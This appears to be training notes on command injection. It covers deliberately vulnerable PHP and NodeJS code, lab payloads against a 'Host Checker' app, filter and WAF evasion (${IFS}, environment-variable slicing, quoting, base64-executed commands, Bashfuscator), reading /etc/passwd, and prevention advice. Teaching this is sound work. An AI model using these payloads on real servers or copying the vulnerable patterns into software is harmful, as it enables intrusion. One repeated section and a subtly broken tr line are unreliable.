# Command Injection Vulnerabilities

Command Injection vulnerabilities are among the most critical types of vulnerabilities in web applications. These vulnerabilities allow attackers to execute system commands directly on the back-end hosting server, potentially compromising the entire network. When a web application uses user-controlled input to execute system commands, attackers may inject malicious payloads to subvert the intended commands and execute arbitrary commands.

## What are Injections?
Injection vulnerabilities rank as the third most significant risk in OWASP's Top 10 Web Application Risks due to their high impact and prevalence. An injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed. This enables attackers to alter the intended query's outcome.

### Common Types of Injections
| Injection Type                  | Description                                                                 |
|---------------------------------|-----------------------------------------------------------------------------|
| **OS Command Injection**        | Occurs when user input is directly used as part of an OS command.           |
| **Code Injection**              | Occurs when user input is directly within a function that evaluates code.   |
| **SQL Injection**               | Occurs when user input is directly used as part of an SQL query.            |
| **Cross-Site Scripting (XSS)**  | Occurs when exact user input is displayed on a web page.                    |

Other types of injection vulnerabilities include LDAP Injection, NoSQL Injection, HTTP Header Injection, XPath Injection, IMAP Injection, ORM Injection, and more. Whenever user input is used within a query without proper sanitization, attackers may escape the boundaries of the user input string to manipulate the parent query.

---

## OS Command Injection

When user input directly or indirectly affects a web query that executes system commands, OS Command Injection vulnerabilities arise. All web programming languages provide functions to execute OS commands directly on the back-end server for various purposes, such as installing plugins or running applications.

### PHP Example
The following PHP code demonstrates a vulnerability to OS command injection:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

This code creates a `.pdf` document in the `/tmp` directory using a filename provided via the `GET` parameter. Since the user input is not sanitized or escaped, the application is vulnerable to OS command injection, allowing attackers to execute arbitrary system commands.

### NodeJS Example
Similarly, a NodeJS application using the `child_process.exec` function can also be vulnerable:

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

The `filename` parameter in the `GET` request is directly used in the `touch` command without sanitization, making the application susceptible to command injection attacks.

### Other Languages
Many web development frameworks and languages, such as Python, Ruby, and Java, have functions that execute system commands. If these functions use unsanitized user input, they may also be exploited using command injection techniques.

### Beyond Web Applications
Command Injection vulnerabilities are not limited to web applications. Other binaries and thick clients that pass unsanitized user input to functions executing system commands can also be exploited using the same methods.

---

## Mitigations
To protect against Command Injection vulnerabilities:

1. **Input Validation and Sanitization:**
   - Use input validation to ensure only expected values are allowed.
   - Escape special characters to prevent command injection.
2. **Use Secure APIs:**
   - Prefer APIs or libraries that do not invoke system commands directly.
3. **Principle of Least Privilege:**
   - Limit the privileges of the application to prevent unauthorized actions.
4. **Code Reviews:**
   - Regularly review code to identify and mitigate vulnerabilities.
5. **Static Analysis Tools:**
   - Use automated tools to detect potential injection vulnerabilities.

By implementing these best practices, developers can significantly reduce the risk of OS Command Injection and other injection vulnerabilities.


## Detection

Detecting basic OS Command Injection vulnerabilities involves attempting to append commands through various injection methods. If the command output changes from the intended result, the vulnerability has been successfully exploited. For advanced cases, fuzzing methods or code reviews may be required to identify potential vulnerabilities and build a payload to achieve command injection.

### Example Exercise
In the following exercise, a web application provides a Host Checker utility where users can input an IP address to check if it is alive. For example, entering the localhost IP `127.0.0.1` returns the output of the `ping` command, indicating the host is alive.

The web application likely executes a command similar to:

```bash
ping -c 1 OUR_INPUT
```

If the user input is not sanitized, it becomes possible to inject arbitrary commands.

---

## Command Injection Methods

To inject additional commands into an existing one, the following operators can be used:

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                                |
|--------------------|---------------------|------------------------|-----------------------------------------------|
| **Semicolon**      | `;`                 | `%3b`                  | Both                                          |
| **New Line**       | `\n`               | `%0a`                  | Both                                          |
| **Background**     | `&`                 | `%26`                  | Both (second output generally shown first)    |
| **Pipe**           | `|`                 | `%7c`                  | Both (only second output is shown)           |
| **AND**            | `&&`                | `%26%26`               | Both (only if first succeeds)                |
| **OR**             | `||`                | `%7c%7c`               | Second (only if first fails)                 |
| **Sub-Shell**      | ````                | `%60%60`               | Both (Linux-only)                            |
| **Sub-Shell**      | `$()`               | `%24%28%29`            | Both (Linux-only)                            |

### Tips:
- Unix-only operators (like ```` or `$()`) work on Linux and macOS but not on Windows.
- The **semicolon (`;`)** does not work with Windows Command Line (CMD) but will work with Windows PowerShell.

Using these operators, attackers can append their desired input (e.g., an IP) followed by an operator and a new command to execute. These methods are effective regardless of the web application language, framework, or back-end server.

---

## Mitigations

To protect against Command Injection vulnerabilities:

1. **Input Validation and Sanitization:**
   - Use input validation to ensure only expected values are allowed.
   - Escape special characters to prevent command injection.
2. **Use Secure APIs:**
   - Prefer APIs or libraries that do not invoke system commands directly.
3. **Principle of Least Privilege:**
   - Limit the privileges of the application to prevent unauthorized actions.
4. **Code Reviews:**
   - Regularly review code to identify and mitigate vulnerabilities.
5. **Static Analysis Tools:**
   - Use automated tools to detect potential injection vulnerabilities.

By implementing these best practices, developers can significantly reduce the risk of OS Command Injection and other injection vulnerabilities.

## Injecting Our Command

We can add a semi-colon after our input IP `127.0.0.1`, and then append our command (e.g., `whoami`), such that the final payload we will use is:

```
127.0.0.1; whoami
```

The final command to be executed would be:

```bash
ping -c 1 127.0.0.1; whoami
```

### Running the Command Locally

First, let's try running the above command on our Linux VM to ensure it does run:

```bash
21y4d@htb[/htb]$ ping -c 1 127.0.0.1; whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

As we can see, the final command successfully runs, and we get the output of both commands (as mentioned in the previous table for `;`).

### Testing the Application

Now, we can try using our previous payload in the Host Checker web application. However, as we can see, the web application refused our input, as it seems only to accept input in an IP format. From the error message, it appears to be originating from the front-end rather than the back-end. 

We can double-check this with the Firefox Developer Tools by clicking `CTRL + SHIFT + E` to show the Network tab and then clicking on the Check button again:

- **Observation:** No new network requests were made when we clicked on the Check button, yet we got an error message. This indicates that the user input validation is happening on the front-end.

### Front-End Validation Limitations

This validation seems to be an attempt to prevent us from sending malicious payloads by only allowing user input in an IP format. However, it is common for developers to perform input validation on the front-end while neglecting to validate or sanitize the input on the back-end. This occurs for various reasons, such as having separate front-end and back-end teams or trusting front-end validation to prevent malicious payloads.

Front-end validations are usually not enough to prevent injections, as they can be bypassed by sending custom HTTP requests directly to the back-end.

---

## Bypassing Front-End Validation

To bypass front-end validation:

1. **Intercept HTTP Requests:**
   - Use a proxy like **Burp Suite** or **ZAP**.
   - Configure the browser to route traffic through the proxy.
2. **Intercept the Request:**
   - Enter a standard IP (e.g., `127.0.0.1`) in the application.
   - Intercept the HTTP request and send it to the repeater tool (`CTRL + R` in Burp Suite).
     ![image](https://github.com/user-attachments/assets/61c7d3b7-aa10-440d-852e-452d7f8d1396)
3. **Customize the Payload:**
   - Modify the intercepted request to include the payload (`127.0.0.1; whoami`).
   - URL-encode the payload if necessary (`CTRL + U` in Burp Suite).
     ![image](https://github.com/user-attachments/assets/a8c0dfdb-1547-45cd-9445-1b2d63c9b124)
4. **Send the Request:**
   - Send the customized request to the server.
   - Observe the response to confirm successful command execution.

### Example Response

If successful, the response may include outputs from both the `ping` and `whoami` commands:

```bash
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

This confirms the command injection vulnerability.

## Other Injection Operators

Before we move on, let us try a few other injection operators and see how differently the web application would handle them.

### AND Operator

We can start with the AND (`&&`) operator, such that our final payload would be:

```
127.0.0.1 && whoami
```
The final executed command would be:

```bash
ping -c 1 127.0.0.1 && whoami
```

#### Running the Command Locally

As always, let's try to run the command on our Linux VM first to ensure that it is a working command:

```bash
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
```

As we can see, the command does run, and we get the same output we got previously. Try to refer to the injection operators table from the previous section and see how the `&&` operator is different (if we do not write an IP and start directly with `&&`, would the command still work?).

Now, we can do the same thing we did before by copying our payload, pasting it in our HTTP request in Burp Suite, URL-encoding it, and then finally sending it.

![image](https://github.com/user-attachments/assets/71667aef-8d93-41cf-b000-6aa7be918a8e)

#### Example Response

As we can see, we successfully injected our command and received the expected output of both commands.

### OR Operator

Finally, let us try the OR (`||`) injection operator. The OR operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the OR operator would make our new command execute if the first one fails.

If we try to use our usual payload with the `||` operator:

```
127.0.0.1 || whoami
```

The command executed would be:

```bash
ping -c 1 127.0.0.1 || whoami
```

#### Running the Command Locally

```bash
21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
```

This is because of how bash commands work. As the first command returns exit code `0` indicating successful execution, the bash command stops and does not try the other command. It would only attempt to execute the other command if the first command failed and returned an exit code `1`.

#### Breaking the First Command

Let us try to intentionally break the first command by not supplying an IP and directly using the `||` operator:

```
|| whoami
```

The command executed would be:

```bash
21y4d@htb[/htb]$ ping -c 1 || whoami

ping: usage error: Destination address required
21y4d
```

As we can see, this time, the `whoami` command did execute after the `ping` command failed and gave us an error message. 

### Testing the Payload

We can now try the `|| whoami` payload in our HTTP request. This time we only got the output of the second command as expected. With this, we are using a much simpler payload and getting a much cleaner result.

---

## Injection Operators Overview

Such operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XML, etc. Below is a list of the most common operators that can be used for injections:

| Injection Type                          | Operators                                   |
|-----------------------------------------|--------------------------------------------|
| **SQL Injection**                       | `'`, `;`, `--`, `/* */`                    |
| **Command Injection**                   | `;`, `&&`                                  |
| **LDAP Injection**                      | `*`, `()`, `&`, `|`                        |
| **XPath Injection**                     | `'`, `or`, `and`, `not`, `substring`       |
| **OS Command Injection**                | `;`, `&`, `|`                              |
| **Code Injection**                      | `'`, `;`, `--`, `/* */`, `$()`, `${}`      |
| **Directory Traversal/File Path**       | `../`, `..\`, `%00`                        |
| **Object Injection**                    | `;`, `&`, `|`                              |
| **XQuery Injection**                    | `'`, `;`, `--`, `/* */`                    |
| **Shellcode Injection**                 | `\x`, `\u`, `%u`, `%n`                    |
| **Header Injection**                    | `\n`, `\r\n`, `\t`, `%0d`, `%0a`, `%09` |

Keep in mind that this table is incomplete, and many other options and operators are possible. It also highly depends on the environment we are working with and testing.

## Identifying Filters

Even if developers attempt to secure the web application against injections, it may still be exploitable if it was not securely coded. Another type of injection mitigation is utilizing blacklisted characters and words on the back-end to detect injection attempts and deny the request if any request contains them. An additional layer of protection is using Web Application Firewalls (WAFs), which may have a broader scope for detecting injections and preventing other attacks like SQL injections or XSS.

This section explores how command injections may be detected and blocked and how to identify what is being filtered.

### Filter/WAF Detection

Let us revisit the Host Checker web application. This time, the application has added mitigations. If we try operators such as (`;`, `&&`, `||`), we receive an error message:

![image](https://github.com/user-attachments/assets/cbbebe92-a772-4c73-9dd1-f39c35c5ab64)

**Invalid Input:**

This indicates a security mechanism in place that denies our request. Depending on the implementation, this error may display differently:

- In our example, the error appears in the same field as the output, indicating detection by the PHP web application.
- If the error shows a different page with details like our IP or request, it suggests denial by a WAF.

#### Example Payload

Our payload:

```bash
127.0.0.1; whoami
```

Contains:

- A semi-colon character `;`
- A space character
- The `whoami` command

The application may have detected a blacklisted character or command—or both. Let us explore how to bypass these restrictions.

### Blacklisted Characters

A web application may use a list of blacklisted characters, denying any request that contains them. For example, the PHP code could look like this:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

If any character in our input matches an entry in the blacklist, the request is denied.

### Identifying Blacklisted Characters

To identify which character is causing the denial:

1. Start with a working payload, e.g., `127.0.0.1`.
2. Gradually add characters one at a time, observing when the request gets blocked.

![image](https://github.com/user-attachments/assets/ba7cfb84-5d08-4e82-91b3-da1991d87650)

#### Example Test

Payload:

```bash
127.0.0.1;
```

Result:

- If the error message appears, the semi-colon `;` is likely blacklisted.
- Repeat this process with other operators (`&&`, `||`) to identify all blacklisted characters.


# Bypassing Space Filters

There are numerous ways to detect injection attempts, and there are multiple methods to bypass these detections. We will be demonstrating the concept of detection and how bypassing works using Linux as an example. We will learn how to utilize these bypasses and eventually be able to prevent them. Once we have a good grasp on how they work, we can go through various sources on the internet to discover other types of bypasses and learn how to mitigate them.

## Bypass Blacklisted Operators

We will see that most of the injection operators are indeed blacklisted. However, the new-line character is usually not blacklisted, as it may be needed in the payload itself. We know that the new-line character works in appending our commands both in Linux and on Windows, so let's try using it as our injection operator:

#### Example Payload

```bash
127.0.0.1%0awhoami
```

As we can see, even though our payload did include a new-line character, our request was not denied, and we did get the output of the `ping` command, which means that this character is not blacklisted, and we can use it as our injection operator. Let us start by discussing how to bypass a commonly blacklisted character - a space character.

---

## Bypass Blacklisted Spaces

Now that we have a working injection operator, let us modify our original payload and send it again as:

```bash
127.0.0.1%0a whoami
```

As we can see, we still get an invalid input error message, meaning that we still have other filters to bypass. So, as we did before, let us only add the next character (which is a space) and see if it caused the denied request:

```bash
127.0.0.1%0a
```

As we can see, the space character is indeed blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!

### Using Tabs

Using tabs (`%09`) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. Let us try to use a tab instead of the space character:

```bash
127.0.0.1%0a%09whoami
```

As we can see, we successfully bypassed the space character filter by using a tab instead. Let us see another method of replacing space characters.

### Using `$IFS`

Using the `$IFS` Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

Let us use `${IFS}` and see if it works:

```bash
127.0.0.1%0a${IFS}whoami
```

We see that our request was not denied this time, and we bypassed the space filter again.

### Using Brace Expansion

There are many other methods we can utilize to bypass space filters. For example, we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces, as follows:

#### Example Command

```bash
DJMC@htb[/htb]$ {ls,-la}
```

Output:

```
total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like:

```bash
127.0.0.1%0a{ls,-la}
```

### Additional Resources

To discover more space filter bypasses, check out the [PayloadsAllTheThings GitHub page](https://github.com/swisskyrepo/PayloadsAllTheThings) on writing commands without spaces.

Ejercicio
  Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?
    ip=127.0.0.1%0a{ls,-la}

# Bypassing Other Blacklisted Characters

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

---

## Linux

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (or any other character) is through Linux Environment Variables like we did with `${IFS}`. While `${IFS}` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify the start and length of our string to exactly match this character.

### Extracting a Slash

For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:

```bash
DJMC@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the 0 character, and only take a string of length 1, we will end up with only the `/` character, which we can use in our payload:

```bash
DJMC@htb[/htb]$ echo ${PATH:0:1}

/
```

Note: When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character.

We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

```bash
DJMC@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

### Exercise
Try to understand how the above command resulted in a semi-colon, and then use it in the payload to use it as an injection operator. Hint: The `printenv` command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.

### Example Payload
Let’s try to use environment variables to add a semi-colon and a space to our payload:

```bash
127.0.0.1${LS_COLORS:10:1}${IFS}
```

Result: As we can see, we successfully bypassed the character filter this time as well.

---

## Windows

The same concept works on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (~6 -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (-11 -> `\`):

```cmd
C:\htb> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same thing using the same variables in Windows PowerShell. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:

```powershell
PS C:\htb> $env:HOMEPATH[0]

\
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need. Try to be creative and find different commands to produce similar characters.

---

## Character Shifting

There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```bash
DJMC@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
DJMC@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.

# Bypassing Blacklisted Commands

We have discussed various methods for bypassing single-character filters. However, there are different methods when it comes to bypassing blacklisted commands. A command blacklist usually consists of a set of words, and if we can obfuscate our commands and make them look different, we may be able to bypass the filters.

There are various methods of command obfuscation that vary in complexity, as we will touch upon later with command obfuscation tools. Here, we will cover a few basic techniques that may enable us to change the look of our command to bypass filters manually.


Ejercicio
  Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?
    ip=127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
---

## Commands Blacklist

We have so far successfully bypassed the character filter for the space and semi-colon characters in our payload. Let us go back to our very first payload and re-add the `whoami` command to see if it gets executed:

#### Example Payload

```bash
127.0.0.1%0awhoami
```

Result: Even though we used characters that are not blocked by the web application, the request gets blocked again once we added our command. This is likely due to a command blacklist filter.

### Example PHP Blacklist Filter

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

The above code checks each word of the user input to see if it matches any blacklisted words. Since the filter looks for an exact match of the provided command, we can utilize obfuscation techniques to bypass it.

---

## Obfuscation Techniques

### Linux & Windows

One common obfuscation technique is inserting certain characters within a command that are ignored by command shells like Bash or PowerShell but still allow the command to execute as intended. These characters include:

- Single quotes `'`
- Double quotes `"`

#### Example with Single Quotes

```bash
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

#### Example with Double Quotes

```bash
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

**Notes:**
- Quotes must be of the same type.
- The number of quotes must be even.

#### Payload Example

```bash
127.0.0.1%0aw'h'o'am'i
```

Result: This method bypasses the filter and executes successfully.

---

### Linux Only

For Linux, additional characters like the backslash `\` and the positional parameter character `$@` can be inserted into commands. These characters are ignored by the Bash shell but still allow the command to execute.

#### Examples

```bash
who$@ami
w\ho\am\i
```

**Exercise:**
- Try the above examples in your payload and check if they bypass the command filter.
- If a filtered character prevents execution, consider bypassing it using techniques from the previous section.

---

### Windows Only

For Windows, characters such as the caret `^` can be used to obfuscate commands.

#### Example

```cmd
C:\htb> who^ami

21y4d
```

---

In the next section, we will discuss more advanced techniques for command obfuscation and filter bypassing.

Ejercicio
  Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
      ip=127.0.0.1${LS_COLORS:10:1}%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

# Advanced Command Obfuscation

In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

---

## Case Manipulation

One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g., `WHOAMI`) or alternating between cases (e.g., `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

### Windows Case Insensitivity

If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:

```powershell
PS C:\htb> WhOaMi

21y4d
```

### Linux Case Sensitivity

For Linux and Bash shells, which are case-sensitive, we can use a command to convert the case to lowercase. Example:

```bash
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

If spaces are filtered, replace them with tabs (`%09`) to bypass the filter.

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi" | tr -s ' ' '%09')
```

Another method:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

---

## Reversed Commands

Reversing commands and executing them in real-time can bypass filters. Example:

### Linux

```bash
DJMC@htb[/htb]$ echo 'whoami' | rev
imaohw

21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

### Windows

```powershell
PS C:\htb> "whoami"[-1..-20] -join ''
imaohw

PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

Tip: To bypass filtered characters, reverse them as well or include them when reversing the original command.

---

## Encoded Commands

Encoding commands can help bypass filters that decode or mess up the payload. Example:

### Linux Base64 Encoding

```bash
DJMC@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

DJMC@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Tip: Avoid filtered characters by replacing spaces or pipes with alternatives.

### Windows Base64 Encoding

Encode the command:

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA
```

Decode and execute it:

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

---

## Additional Techniques

- **Wildcards**
- **Regex**
- **Output Redirection**
- **Integer Expansion**

Refer to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) for more advanced techniques.

Ejercicio
  Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
    echo -n 'f"in"d /usr/share/ | g"re"p root | g"re"p mysql | t"ai"l -n 1' | base64
    ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZiJpbiJkIC91c3Ivc2hhcmUvIHwgZyJyZSJwIHJvb3QgfCBnInJlInAgbXlzcWwgfCB0ImFpImwgLW4gMQ==)


# Evasion Tools

If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for Linux and another for Windows.

---

## Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is **Bashfuscator**. We can clone the repository from GitHub and then install its requirements, as follows:

```bash
DJMC@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
DJMC@htb[/htb]$ cd Bashfuscator
DJMC@htb[/htb]$ pip3 install setuptools==65
DJMC@htb[/htb]$ python3 setup.py install --user
```

Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as seen in the `-h` help menu:

```bash
DJMC@htb[/htb]$ cd ./bashfuscator/bin/
DJMC@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

### Obfuscating a Command

We can start by providing the command we want to obfuscate with the `-c` flag:

```bash
DJMC@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

Running the tool this way will randomly pick an obfuscation technique, producing a command length ranging from a few hundred characters to over a million characters. We can use additional flags to produce shorter, simpler obfuscated commands:

```bash
DJMC@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

### Testing the Command

We can test the obfuscated command with `bash -c ''` to ensure it executes the intended command:

```bash
DJMC@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

### Exercise
- Test the outputted command with a web application to see if it can bypass filters.
- If it fails, identify why and adjust the tool’s settings to produce a working payload.

---

## Windows (DOSfuscation)

A similar tool for Windows is **DOSfuscation**, which is interactive. It allows us to generate obfuscated commands for CMD and PowerShell. Clone the tool from GitHub and invoke it through PowerShell:

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
```

### Help Menu

```powershell
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

### Obfuscating a Command

Set the command you want to obfuscate and use one of the encoding techniques:

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

### Testing the Command

Run the obfuscated command in CMD:

```cmd
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

# Command Injection Prevention

We should now have a solid understanding of how command injection vulnerabilities occur and how certain mitigations like character and command filters may be bypassed. This section will discuss methods we can use to prevent command injection vulnerabilities in our web applications and properly configure the webserver to prevent them.

---

## System Commands

- **Avoid system commands**: Always avoid using functions that execute system commands, especially when user input is involved. Indirect influence by a user could still lead to vulnerabilities.
- **Use built-in functions**: Instead of system commands, use built-in functions for required functionalities. For example, in PHP, use `fsockopen` instead of `exec` or `system`.
- **Limit use of system commands**: If no alternative exists, validate and sanitize user input rigorously before using it with system commands.

---

## Input Validation

- **Validate user input**: Ensure that user input matches the expected format, both on the front-end and back-end.
- **Use built-in validation filters**: For example, in PHP:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

- **Regex for custom formats**: If validation requires a non-standard format, use regular expressions:

### PHP Example

```php
if (preg_match('/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' .
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' .
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.' .
                '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/', $ip)) {
    // call function
}
```

### JavaScript Example

```javascript
if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)) {
    // call function
} else {
    // deny request
}
```

For NodeJS, use libraries like `is-ip` for validation.

---

## Input Sanitization

- **Remove unnecessary characters**: Perform sanitization after validation. For example, in PHP:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

- **JavaScript Example**:

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

- **Use libraries for advanced sanitization**: For example, DOMPurify for NodeJS:

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
